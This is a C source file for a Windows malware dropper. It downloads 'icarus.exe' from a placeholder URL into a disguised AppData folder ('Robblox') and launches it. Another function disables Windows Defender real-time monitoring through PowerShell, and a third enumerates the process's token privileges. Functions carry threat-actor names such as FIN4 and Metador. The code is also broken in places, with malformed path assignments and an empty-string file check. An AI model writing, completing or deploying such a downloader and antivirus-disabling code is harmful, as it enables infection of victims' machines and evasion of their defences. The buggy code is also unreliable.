#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winhttp.h>
#include <stdbool.h>
#include <sys/stat.h>

int main(){

    char *ppp = Saint_Bear();
    char *path;

    if(Metador()){
        path = "%s\\Local\\Robblox", ppp;
    }else{
        path = "C:\\Users\\Public\\Videos";
    }

    Rhea(path);

        STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Path to your executable
    char exePath[MAX_PATH];
    snprintf(exePath, MAX_PATH, "%s\\icarus.exe", path);

    // Start the process
    CreateProcessA(
        exePath,   // Application name
        NULL,      // Command line arguments
        NULL,      // Process handle not inheritable
        NULL,      // Thread handle not inheritable
        FALSE,     // Set handle inheritance to FALSE
        0,         // No creation flags
        NULL,      // Use parent's environment block
        NULL,      // Use parent's starting directory 
        &si,       // Pointer to STARTUPINFO structure
        &pi
    );       // Pointer to PROCESS_INFORMATION structure
    

    // Wait until the process exits
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

bool Metador() {
    char *ppp = Saint_Bear();
    char *path = "%s\\Local\\Robblox", ppp;

    struct stat buffer;
    if (stat("", &buffer) == 0) {
        return true;
    } else {
        return false;
    }
}

char* Saint_Bear() {
    char* bronze_silhouette = getenv("APPDATA");
    return bronze_silhouette;
}

int Rhea(char *path) {
    const wchar_t *url = L"https://example.com/icarus.exe"; // fill in when needed ==================================================
    const wchar_t *out = path;

    URL_COMPONENTS uc = {0};
    uc.dwStructSize = sizeof(uc);

    wchar_t host[256], path[1024];
    uc.lpszHostName = host;
    uc.dwHostNameLength = _countof(host);
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = _countof(path);

    WinHttpCrackUrl(url, 0, 0, &uc);

    HINTERNET hSession = WinHttpOpen(L"Downloader/1.0",  
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, uc.lpszHostName, uc.nPort, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uc.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);

    if(WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
       WinHttpReceiveResponse(hRequest, NULL)) {
        FILE *f = _wfopen(out, L"wb");
        DWORD bytes;
        char buffer[4096];
        while(WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytes) && bytes)
            fwrite(buffer, 1, bytes, f);
        fclose(f);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}






//=================================================== make downloader and runner
int WhiteBear(){
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    // The command you want to run
    LPCSTR cmd = "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true";

    CreateProcessA(
        NULL,
        (LPSTR)cmd,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    

    return 0;
}

char** FIN4(DWORD* outCount){
     *outCount = 0;    // default return count
    HANDLE token;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return NULL;

    DWORD len = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &len);

    TOKEN_PRIVILEGES* priv = (TOKEN_PRIVILEGES*)malloc(len);
    if (!priv) {
        CloseHandle(token);
        return NULL;
    }

    if (!GetTokenInformation(token, TokenPrivileges, priv, len, &len)) {
        free(priv);
        CloseHandle(token);
        return NULL;
    }

    DWORD count = priv->PrivilegeCount;
    char** list = (char**)malloc(count * sizeof(char*));
    if (!list) {
        free(priv);
        CloseHandle(token);
        return NULL;
    }

    for (DWORD i = 0; i < count; i++)
    {
        LUID_AND_ATTRIBUTES la = priv->Privileges[i];

        char name[256];
        DWORD nameLen = sizeof(name);

        if (!LookupPrivilegeNameA(NULL, &la.Luid, name, &nameLen)) {
            list[i] = _strdup("UNKNOWN_PRIVILEGE");
        } else {
            // Allocate "Name : ENABLED"/"DISABLED"
            char enabledText[16];
            snprintf(enabledText, sizeof(enabledText),
                     (la.Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "DISABLED");

            size_t totalLen = strlen(name) + strlen(enabledText) + 5;
            list[i] = (char*)malloc(totalLen);
            snprintf(list[i], totalLen, "%s : %s", name, enabledText);
        }
    }

    free(priv);
    CloseHandle(token);

    *outCount = count;
    return list;
}